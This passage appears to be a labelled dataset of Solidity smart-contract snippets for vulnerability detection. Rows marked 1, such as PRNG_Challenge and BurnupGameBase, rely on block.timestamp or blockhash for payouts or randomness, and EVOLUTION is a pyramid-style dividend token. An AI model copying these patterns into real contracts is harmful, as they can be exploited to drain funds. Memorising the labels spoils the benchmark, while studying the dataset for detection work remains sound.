< 80){                bonusPercentage = 40;            }else if (tokensSoldPercentage >= 80 && tokensSoldPercentage < 90){                bonusPercentage = 20;            }else if (tokensSoldPercentage >= 90){                bonusPercentage = 0;            }else{                revert();            }        } else revert();        uint resultValue = amountInCents.mul(tokenMultiplier).div(oneTokenInCents);        uint tokenAmount = resultValue.mul(bonusStateMultiplier.mul(100).add(bonusPercentage)).div(bonusStateMultiplier.mul(100));        uint tokensLeft = getTokensLeftForSale(currentState);        if (tokenAmount > tokensLeft){            tokenAmount = tokensLeft;        }        require(tokenAmount != 0);        if (investedAmountOf[receiver] == 0) {            investorCount++;        }        internalAssignTokens(receiver, tokenAmount, weiAmount, amountInCents, txId);        updateStat(currentState, receiver, tokenAmount, weiAmount);        if (txId == 0){            internalDeposit(destinationMultisigWallet, weiAmount);        }    }    function internalDeposit(address receiver, uint weiAmount) internal{    }    function internalRefund(address receiver, uint weiAmount) internal{    }    function internalEnableRefunds() internal{    }    function internalPreallocate(State currentState, address receiver, uint tokenAmount, uint weiAmount) internal {        require(getTokensLeftForSale(currentState) >= tokenAmount);        internalAssignTokens(receiver, tokenAmount, weiAmount, getWeiInCents(weiAmount), 0);        updateStat(currentState, receiver, tokenAmount, weiAmount);    }    function internalSuccessOver() internal {    }    function internalSetDestinationMultisigWallet(address destinationAddress) internal{    }    function updateStat(State currentState, address receiver, uint tokenAmount, uint weiAmount) private{        weiRaised = weiRaised.add(weiAmount);        tokensSold = tokensSold.add(tokenAmount);        if (currentState == State.FirstStageFunding){            firstStageRaisedInWei = firstStageRaisedInWei.add(weiAmount);            firstStageTokensSold = firstStageTokensSold.add(tokenAmount);        }        if (currentState == State.SecondStageFunding){            secondStageRaisedInWei = secondStageRaisedInWei.add(weiAmount);            secondStageTokensSold = secondStageTokensSold.add(tokenAmount);        }        investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);        tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);    }    function setDestinationMultisigWallet(address destinationAddress) public onlyOwner canSetDestinationMultisigWallet{        destinationMultisigWallet = destinationAddress;        internalSetDestinationMultisigWallet(destinationAddress);    }    function changeCurrentEtherRateInCents(uint value) public onlyOwner {        require(value > 0);        currentEtherRateInCents = value;        ExchangeRateChanged(currentEtherRateInCents, value);    }    function preallocateFirstStage(address receiver, uint tokenAmount, uint weiAmount) public onlyOwner isFirstStageFundingOrEnd {        internalPreallocate(State.FirstStageFunding, receiver, tokenAmount, weiAmount);    }    function preallocateSecondStage(address receiver, uint tokenAmount, uint weiAmount) public onlyOwner isSecondStageFundingOrEnd {        internalPreallocate(State.SecondStageFunding, receiver, tokenAmount, weiAmount);    }    function issueTeamTokens() public onlyOwner inState(State.Success) {        require(block.timestamp >= teamTokensIssueDate);        uint teamTokenTransferAmount = teamTokenAmount.mul(10 ** token.decimals());        if (!token.transfer(teamAccount, teamTokenTransferAmount)) revert();    }    function enableRefunds() public onlyOwner canEnableRefunds{        isRefundingEnabled = true;        token.burnAllOwnerTokens();        internalEnableRefunds();    }    function buy() public payable {        internalInvest(msg.sender, msg.value, 0);    }    function externalBuy(address buyerAddress, uint weiAmount, uint txId) external onlyOwner {        require(txId != 0);        internalInvest(buyerAddress, weiAmount, txId);    }    function refund() public inState(State.Refunding) {        uint weiValue = investedAmountOf[msg.sender];        require(weiValue != 0);        uint saleContractTokenCount = tokenAmountOf[msg.sender];        uint tokenContractTokenCount = token.balanceOf(msg.sender);        require(saleContractTokenCount <= tokenContractTokenCount);        investedAmountOf[msg.sender] = 0;        weiRefunded = weiRefunded.add(weiValue);        internalRefund(msg.sender, weiValue);    }    function finalizeFirstStage() public onlyOwner isNotSuccessOver {        require(!isFirstStageFinalized);        token.burnAllOwnerTokens();        mintTokensForSecondStage();        isFirstStageFinalized = true;    }    function finalizeSecondStage() public onlyOwner isNotSuccessOver {        require(isFirstStageFinalized && !isSecondStageFinalized);        if (isSoftCapGoalReached()){            uint tokenMultiplier = 10 ** token.decimals();            uint remainingTokens = secondStageTokensForSale.mul(tokenMultiplier).sub(secondStageTokensSold);            if (remainingTokens > 0){                token.burnOwnerTokens(remainingTokens);            }            uint advisorsTokenTransferAmount = advisorsTokenAmount.mul(tokenMultiplier);            uint marketingTokenTransferAmount = marketingTokenAmount.mul(tokenMultiplier);            uint supportTokenTransferAmount = supportTokenAmount.mul(tokenMultiplier);            if (!token.transfer(advisorsAccount, advisorsTokenTransferAmount)) revert();            if (!token.transfer(marketingAccount, marketingTokenTransferAmount)) revert();            if (!token.transfer(supportAccount, supportTokenTransferAmount)) revert();            isSuccessOver = true;            internalSuccessOver();        }else{            token.burnAllOwnerTokens();        }        isSecondStageFinalized = true;    }    function setFirstStageStartsAt(uint time) public onlyOwner {        firstStageStartsAt = time;        FirstStageStartsAtChanged(firstStageStartsAt);    }    function setFirstStageEndsAt(uint time) public onlyOwner {        firstStageEndsAt = time;        FirstStageEndsAtChanged(firstStageEndsAt);    }    function setSecondStageStartsAt(uint time) public onlyOwner {        secondStageStartsAt = time;        SecondStageStartsAtChanged(secondStageStartsAt);    }    function setSecondStageEndsAt(uint time) public onlyOwner {        secondStageEndsAt = time;        SecondStageEndsAtChanged(secondStageEndsAt);    }    function setSoftCapInCents(uint value) public onlyOwner {        require(value > 0);        softCapFundingGoalInCents = value;        SoftCapChanged(softCapFundingGoalInCents);    }    function setHardCapInCents(uint value) public onlyOwner {        require(value > 0);        hardCapFundingGoalInCents = value;        HardCapChanged(hardCapFundingGoalInCents);    }    function isSoftCapGoalReached() public constant returns (bool) {        return getWeiInCents(weiRaised) >= softCapFundingGoalInCents;    }    function isHardCapGoalReached() public constant returns (bool) {        return getWeiInCents(weiRaised) >= hardCapFundingGoalInCents;    }    function getTokensLeftForSale(State forState) public constant returns (uint) {        uint tokenBalance = token.balanceOf(address(this));        uint tokensReserve = 0;        if (forState == State.SecondStageFunding) tokensReserve = secondStageReserve.mul(10 ** token.decimals());        if (tokenBalance <= tokensReserve){            return 0;        }        return tokenBalance.sub(tokensReserve);    }    function getState() public constant returns (State) {        if (isSuccessOver) return State.Success;        if (isRefundingEnabled) return State.Refunding;        if (block.timestamp < firstStageStartsAt) return State.PreFunding;        if (!isFirstStageFinalized){            bool isFirstStageTime = block.timestamp >= firstStageStartsAt && block.timestamp <= firstStageEndsAt;            if (isFirstStageTime) return State.FirstStageFunding;            else return State.FirstStageEnd;        } else {            if(block.timestamp < secondStageStartsAt)return State.FirstStageEnd;            bool isSecondStageTime = block.timestamp >= secondStageStartsAt && block.timestamp <= secondStageEndsAt;            if (isSecondStageFinalized){                if (isSoftCapGoalReached())return State.Success;                else return State.Failure;            }else{                if (isSecondStageTime)return State.SecondStageFunding;                else return State.SecondStageEnd;            }        }    }    modifier inState(State state) {        require(getState() == state);        _;    }    modifier inFirstOrSecondFundingState() {        State curState = getState();        require(curState == State.FirstStageFunding || curState == State.SecondStageFunding);        _;    }    modifier notHardCapReached(){        require(!isHardCapGoalReached());        _;    }    modifier isFirstStageFundingOrEnd() {        State curState = getState();        require(curState == State.FirstStageFunding || curState == State.FirstStageEnd);        _;    }    modifier isNotSuccessOver() {        require(!isSuccessOver);        _;    }    modifier isSecondStageFundingOrEnd() {        State curState = getState();        require(curState == State.SecondStageFunding || curState == State.SecondStageEnd);        _;    }    modifier canEnableRefunds(){        require(!isRefundingEnabled && getState() != State.Success);        _;    }    modifier canSetDestinationMultisigWallet(){        require(getState() != State.Success);        _;    }}library Math {  function max64(uint64 a, uint64 b) internal constant returns (uint64) {    return a >= b ? a : b;  }  function min64(uint64 a, uint64 b) internal constant returns (uint64) {    return a < b ? a : b;  }  function max256(uint256 a, uint256 b) internal constant returns (uint256) {    return a >= b ? a : b;  }  function min256(uint256 a, uint256 b) internal constant returns (uint256) {    return a < b ? a : b;  }}
0<CODESPLIT>contract FundsVault is Ownable, ValidationUtil {    using SafeMath for uint;    using Math for uint;    enum State {Active, Refunding, Closed}    mapping (address => uint256) public deposited;    address public wallet;    State public state;    event Closed();    event RefundsEnabled();    event Refunded(address indexed beneficiary, uint256 weiAmount);    function FundsVault(address _wallet) {        requireNotEmptyAddress(_wallet);        wallet = _wallet;        state = State.Active;    }    function deposit(address investor) public payable onlyOwner inState(State.Active) {        deposited[investor] = deposited[investor].add(msg.value);    }    function close() public onlyOwner inState(State.Active) {        state = State.Closed;        Closed();        wallet.transfer(this.balance);    }    function setWallet(address newWalletAddress) public onlyOwner inState(State.Active) {        wallet = newWalletAddress;    }    function enableRefunds() public onlyOwner inState(State.Active) {        state = State.Refunding;        RefundsEnabled();    }    function refund(address investor, uint weiAmount) public onlyOwner inState(State.Refunding){        uint256 depositedValue = weiAmount.min256(deposited[investor]);        deposited[investor] = 0;        investor.transfer(depositedValue);        Refunded(investor, depositedValue);    }    modifier inState(State _state) {        require(state == _state);        _;    }}
0<CODESPLIT>contract RefundableAllocatedCappedCrowdsale is AllocatedCappedCrowdsale {    FundsVault public fundsVault;    mapping (address => bool) public refundedInvestors;    function RefundableAllocatedCappedCrowdsale(uint _currentEtherRateInCents, address _token, address _destinationMultisigWallet, uint _firstStageStartsAt, uint _firstStageEndsAt, uint _secondStageStartsAt, uint _secondStageEndsAt, address _advisorsAccount, address _marketingAccount, address _supportAccount, address _teamAccount, uint _teamTokensIssueDate) AllocatedCappedCrowdsale(_currentEtherRateInCents, _token, _destinationMultisigWallet, _firstStageStartsAt, _firstStageEndsAt, _secondStageStartsAt, _secondStageEndsAt, _advisorsAccount, _marketingAccount, _supportAccount, _teamAccount, _teamTokensIssueDate) {        fundsVault = new FundsVault(_destinationMultisigWallet);    }    function internalSetDestinationMultisigWallet(address destinationAddress) internal{        fundsVault.setWallet(destinationAddress);        super.internalSetDestinationMultisigWallet(destinationAddress);    }    function internalSuccessOver() internal {        fundsVault.close();        super.internalSuccessOver();    }    function internalDeposit(address receiver, uint weiAmount) internal{        fundsVault.deposit.value(weiAmount)(msg.sender);    }    function internalEnableRefunds() internal{        super.internalEnableRefunds();        fundsVault.enableRefunds();    }    function internalRefund(address receiver, uint weiAmount) internal{        if (refundedInvestors[receiver]) revert();        fundsVault.refund(receiver, weiAmount);        refundedInvestors[receiver] = true;    }}
0<CODESPLIT>contract TTest is BaseToken, BurnToken, AirdropToken, LockToken {    function TTest() public {        totalSupply = 36000000000000000;        name = "ABCToken";        symbol = "ABC";        decimals = 8;		        owner = msg.sender;        airAmount = 100000000;        airSender = 0x8888888888888888888888888888888888888888;        airLimitCount = 1;          balanceOf[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920] = 3600000000000000;        Transfer(address(0), 0x7F268F51f3017C3dDB9A343C8b5345918D2AB920, 3600000000000000);        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 3600000000000000, endtime: 1528189200}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 3240000000000000, endtime: 1528192800}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 2880000000000000, endtime: 1528196400}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 2520000000000000, endtime: 1528200000}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 2160000000000000, endtime: 1528203600}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 1800000000000000, endtime: 1528207200}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 1440000000000000, endtime: 1528210800}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 1080000000000000, endtime: 1528214400}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 720000000000000, endtime: 1528218000}));        lockedAddresses[0x7F268F51f3017C3dDB9A343C8b5345918D2AB920].push(LockMeta({remain: 360000000000000, endtime: 1528221600}));        balanceOf[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3] = 3600000000000000;        Transfer(address(0), 0xE4CB2A481375E0208580194BD38911eE6c2d3fA3, 3600000000000000);        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 3600000000000000, endtime: 1528189200}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 3240000000000000, endtime: 1528192800}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 2880000000000000, endtime: 1528196400}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 2520000000000000, endtime: 1528200000}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 2160000000000000, endtime: 1528203600}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 1800000000000000, endtime: 1528207200}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 1440000000000000, endtime: 1528210800}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 1080000000000000, endtime: 1528214400}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 720000000000000, endtime: 1528218000}));        lockedAddresses[0xE4CB2A481375E0208580194BD38911eE6c2d3fA3].push(LockMeta({remain: 360000000000000, endtime: 1528221600}));        balanceOf[0x6a15b2BeC95243996416F6baBd8f288f7B4a8312] = 3600000000000000;        Transfer(address(0), 0x6a15b2BeC95243996416F6baBd8f288f7B4a8312, 3600000000000000);        balanceOf[0x0863f878b6a1d9271CB5b775394Ff8AF2689456f] = 10800000000000000;        Transfer(address(0), 0x0863f878b6a1d9271CB5b775394Ff8AF2689456f, 10800000000000000);        balanceOf[0x73149136faFc31E1bA03dC240F5Ad903F2E1aE2e] = 3564000000000000;        Transfer(address(0), 0x73149136faFc31E1bA03dC240F5Ad903F2E1aE2e, 3564000000000000);        lockedAddresses[0x73149136faFc31E1bA03dC240F5Ad903F2E1aE2e].push(LockMeta({remain: 1663200000000000, endtime: 1528182000}));        lockedAddresses[0x73149136faFc31E1bA03dC240F5Ad903F2E1aE2e].push(LockMeta({remain: 1188000000000000, endtime: 1528181400}));        balanceOf[0xF63ce8e24d18FAF8D5719f192039145D010c7aBd] = 10836000000000000;        Transfer(address(0), 0xF63ce8e24d18FAF8D5719f192039145D010c7aBd, 10836000000000000);        lockedAddresses[0xF63ce8e24d18FAF8D5719f192039145D010c7aBd].push(LockMeta({remain: 2167200000000000, endtime: 1528182000}));    }        function() public {        airdrop();    }}
1<CODESPLIT>contract PRNG_Challenge {    uint256 public constant lucky_number = 108435827775939881852079940206236050880764931249577763315065068000725104274235;    address public winner;    function challenge() private {        address participant = msg.sender;        uint64 shift_32 = uint64(4294967296);          uint32 hash32 = uint32(sha3(msg.value,participant,participant.balance,block.blockhash(block.number-1),block.timestamp,block.number));          uint64 hash64 = uint64(hash32) * shift_32 + uint32(sha3(hash32));        if (hash64 == lucky_number) {            if (!participant.send(this.balance)) throw;            winner = participant;        }        return;    }}
1<CODESPLIT>contract InternetWall {    struct Message{        uint timestamp;    }    Message[10] messages;    uint messagesIndex;    function addMessage() payable returns(uint) {        Message memory newMsg;        newMsg.timestamp = block.timestamp;        messages[messagesIndex] = newMsg;        messagesIndex++;        return messagesIndex;    }}
0<CODESPLIT>contract BettingControllerInterface {    function remoteBettingClose() external;    function depositHouseTakeout() external payable;}
1<CODESPLIT>contract CopaDelCrypto {  address public owner;  modifier onlyOwner {    require(msg.sender == owner);    _;  }  uint256 public prizeValue;  uint256 public resultsPublishedTime;  address[] public players;  function CancelGame() public onlyOwner {    resultsPublishedTime = block.timestamp;    prizeValue = address(this).balance / players.length;    return;  }}
0<CODESPLIT>contract EGOLD is Consts, FreezableMintableToken, BurnableToken, Pausable    {        event Initialized();    bool public initialized = false;    function MainToken() public {        init();        transferOwnership(TARGET_USER);    }    function init() private {        require(!initialized);        initialized = true;        if (PAUSED) {            pause();        }                address[1] memory addresses = [address(0x8f71659fb57E6C6Be3Ab563D0dD45101235ae762)];        uint[1] memory amounts = [uint(100000000000000000000000000)];        uint64[1] memory freezes = [uint64(0)];        for (uint i = 0; i < addresses.length; i++) {            if (freezes[i] == 0) {                mint(addresses[i], amounts[i]);            } else {                mintAndFreeze(addresses[i], amounts[i], freezes[i]);            }        }                if (!CONTINUE_MINTING) {            finishMinting();        }        Initialized();    }        function name() pure public returns (string _name) {        return TOKEN_NAME;    }    function symbol() pure public returns (string _symbol) {        return TOKEN_SYMBOL;    }    function decimals() pure public returns (uint8 _decimals) {        return TOKEN_DECIMALS_UINT8;    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {        require(!paused);        return super.transferFrom(_from, _to, _value);    }    function transfer(address _to, uint256 _value) public returns (bool _success) {        require(!paused);        return super.transfer(_to, _value);    }}
0<CODESPLIT>contract EVOLUTION {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }             modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                     modifier onlyAdministrator(){        require(msg.sender == investor);        _;    }                 event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );        event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );        event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );        event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (          uint256 amount,        uint256 timestamp    );             event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );                 string public name = "EVO";    string public symbol = "EVO";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 10;    uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;             uint256 public stakingRequirement = 5e18;                         mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;      bool internal whitelist_ = true;          address public investor;                  constructor()        public    {        investor = 0x85ADF4cF1e98487c849805D0B28a570F15943E56;        whitelisted_[0x85ADF4cF1e98487c849805D0B28a570F15943E56] = true;    }                  function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }             function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }             function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                           address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         uint256 _tokens = purchaseTokens(_dividends, 0x0);                         emit onReinvestment(_customerAddress, _dividends, _tokens);    }             function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                         withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                           payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         _customerAddress.transfer(_dividends);                         emit onWithdraw(_customerAddress, _dividends);    }             function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _investmentEth = SafeMath.div(_ethereum, 20);          uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends+_investmentEth));                investor.transfer(_investmentEth);                   tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                                if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                         emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }              function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                         if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                         emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                         return true;           }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                         profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                         emit OnRedistribution(ethereum, block.timestamp);             }             function setAdministrator(address _newInvestor)        onlyAdministrator()        external    {        investor = _newInvestor;    }             function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }             function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }             function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }                  function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }             function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }             function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }              function myDividends(bool _includeReferralBonus)         public         view         returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }             function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }             function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }             function sellPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }             function buyPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }             function calculateTokensReceived(uint256 _ethereumToSpend)         public         view         returns(uint256)    {        uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                return _amountOfTokens;    }             function calculateEthereumReceived(uint256 _tokensToSell)         public         view         returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }        function disableWhitelist() external {        require(whitelisted_[msg.sender] == true);        whitelist_ = false;    }    function activateWhitelist() external {        require(whitelisted_[msg.sender] == true);        whitelist_ = true;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        internal        returns(uint256)    {                                     if (whitelisted_[msg.sender] == false && whitelist_ == true) {             revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);        uint256 _investmentEth = SafeMath.div(_incomingEthereum, 20);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);        uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends+_investmentEth));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;        investor.transfer(_investmentEth);                                              require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                         if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                         if(tokenSupply_ > 0){                                     tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                                     _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));                } else {                         tokenSupply_ = _amountOfTokens;        }                         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                                  int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;                         emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);                return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =          (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;          return _tokensReceived;    }              function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }                      function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
1<CODESPLIT>contract BurnupGameBase {    uint256[] public activeTimesFrom;    function canStart() public view returns (bool) {        uint256 timeOfWeek = (block.timestamp - 345600) % 604800;        uint256 windows = activeTimesFrom.length;        for (uint256 i = 0; i < windows; i++) {            if (timeOfWeek >= activeTimesFrom[i]) {                return true;            }        }        return false;    }}
1<CODESPLIT>contract CTCLock is Ownable {  using SafeMath for uint256;  address public teamWallet;  address public earlyWallet;  address public institutionWallet;    uint256 public teamTimeLock = 1000 days;  uint256 public earlyTimeLock = 5 * 30 days;  uint256 public institutionTimeLock = 50 * 30 days;       uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);  uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);  uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);    uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);    uint256 public teamStageSetting = 34;  uint256 public earlyStageSetting = 5;  uint256 public institutionStageSetting = 50;  ERC20Basic public token;     uint256 public start;     uint256 public lockStartTime;         mapping(address => uint256) public allocations;        mapping(address => uint256) public stageSettings;        mapping(address => uint256) public timeLockDurations;         mapping(address => uint256) public releasedAmounts;        modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }    function CTCLock(ERC20Basic _token,                          address _teamWallet,                          address _earlyWallet,                          address _institutionWallet,                          uint256 _start,                          uint256 _lockTime)public{        require(_start > 0);        require(_lockTime > 0);        require(_start.add(_lockTime) > 0);        require(_teamWallet != address(0));        require(_earlyWallet != address(0));        require(_institutionWallet != address(0));                token = _token;        teamWallet = _teamWallet;        earlyWallet = _earlyWallet;        institutionWallet = _institutionWallet;        start = _start;        lockStartTime = start.add(_lockTime);    }        function allocateToken() onlyOwner public{        require(block.timestamp > lockStartTime);                 require(allocations[teamWallet] == 0);        require(token.balanceOf(address(this)) == totalAllocation);                allocations[teamWallet] = teamAllocation;        allocations[earlyWallet] = earlyAllocation;        allocations[institutionWallet] = institutionAllocation;                stageSettings[teamWallet] = teamStageSetting;        stageSettings[earlyWallet] = earlyStageSetting;        stageSettings[institutionWallet] = institutionStageSetting;                